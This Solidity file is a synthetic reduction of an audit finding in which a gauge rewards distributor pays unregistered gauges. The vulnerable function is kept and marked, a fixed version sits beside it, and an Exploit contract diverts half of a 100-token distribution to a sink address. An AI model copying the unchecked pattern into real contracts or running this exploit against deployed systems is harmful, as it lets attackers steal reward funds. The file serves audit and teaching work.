// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum GaugeRewardsDistributor — rewards go to gauges that were
    never registered for the token (Pashov, finding 66191 / H-29).
    SYNTHETIC, cheatcode-free reduction.
    distributeRewards copies every active gauge and sends an equal share.
    It never checks gaugeRewardTokens[gauge][token]. A staker in an
    unregistered gauge claims half of a 100-token distribution that should
    have gone entirely to the registered gauge. Vulnerable write (@> VULN). */

contract Token {
    string public symbol = "RWA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Gauge {
    Token public stakingToken;
    mapping(address => uint256) public stakeOf;
    mapping(address => uint256) public rewardOf;
    address public soleStaker;

    constructor(Token staking) {
        stakingToken = staking;
    }

    function stake(uint256 amount) external {
        stakingToken.transferFrom(msg.sender, address(this), amount);
        stakeOf[msg.sender] += amount;
        soleStaker = msg.sender;
    }

    function accountReward(address, uint256 amount) external {
        rewardOf[soleStaker] += amount;
    }

    function claim(Token reward) external returns (uint256 amount) {
        amount = rewardOf[msg.sender];
        rewardOf[msg.sender] = 0;
        reward.transfer(msg.sender, amount);
    }
}

contract GaugeController {
    address[] public active;

    function add(address gauge) external {
        active.push(gauge);
    }

    function getActiveGauges() external view returns (address[] memory) {
        return active;
    }
}

contract GaugeRewardsDistributor {
    Token public token;
    GaugeController public controller;
    mapping(address => mapping(address => bool)) public gaugeRewardTokens;
    mapping(address => address[]) public activeCycleGauges;
    uint256 public constant MAX_ACTIVE_GAUGES = 100;

    constructor(Token t, GaugeController c) {
        token = t;
        controller = c;
    }

    function addGaugeRewardToken(address gauge) external {
        gaugeRewardTokens[gauge][address(token)] = true;
    }

    function distributeRewards() external {
        address[] memory activeGauges = controller.getActiveGauges();
        uint256 count;
        uint256 each = token.balanceOf(address(this)) / activeGauges.length;
        for (uint256 i = 0; i < activeGauges.length; i++) {
            address gauge = activeGauges[i];
            activeCycleGauges[address(token)].push(gauge); // @> VULN: no gaugeRewardTokens[gauge][token] check
            count += 1;
            if (count >= MAX_ACTIVE_GAUGES) break;
            token.transfer(gauge, each);
            Gauge(gauge).accountReward(address(token), each);
        }
    }

    function distributeRewardsFixed() external {
        address[] memory activeGauges = controller.getActiveGauges();
        uint256 eligible;
        for (uint256 i = 0; i < activeGauges.length; i++) {
            if (gaugeRewardTokens[activeGauges[i]][address(token)]) eligible += 1;
        }
        uint256 each = token.balanceOf(address(this)) / eligible;
        for (uint256 i = 0; i < activeGauges.length; i++) {
            address gauge = activeGauges[i];
            if (!gaugeRewardTokens[gauge][address(token)]) continue;
            token.transfer(gauge, each);
            Gauge(gauge).accountReward(address(token), each);
        }
    }
}

contract Exploit {
    Token public reward; // CREATE nonce 1
    Token public staking; // CREATE nonce 2
    Gauge public registered; // CREATE nonce 3
    Gauge public stranger; // CREATE nonce 4
    GaugeController public controller; // CREATE nonce 5
    GaugeRewardsDistributor public distributor; // CREATE nonce 6
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    address public constant HONEST = 0x000000000000000000000000000000000000bEEF;

    constructor() {
        reward = new Token();
        staking = new Token();
        registered = new Gauge(staking);
        stranger = new Gauge(staking);
        controller = new GaugeController();
        distributor = new GaugeRewardsDistributor(reward, controller);
    }

    function run() external {
        controller.add(address(stranger));
        controller.add(address(registered));
        distributor.addGaugeRewardToken(address(registered));

        staking.mint(address(this), 2e18);
        staking.approve(address(stranger), 1e18);
        stranger.stake(1e18);
        staking.transfer(HONEST, 1e18);

        reward.mint(address(distributor), 100e18);
        distributor.distributeRewards();
        uint256 stolen = stranger.claim(reward);
        reward.transfer(SINK, stolen);

        require(!distributor.gaugeRewardTokens(address(stranger), address(reward)), "stranger not registered");
        require(distributor.gaugeRewardTokens(address(registered), address(reward)), "registered");
        require(stolen == 50e18, "half diverted");
        require(reward.balanceOf(address(registered)) == 50e18, "intended gauge short");
        require(reward.balanceOf(SINK) == 50e18, "attacker claimed the half");
    }
}
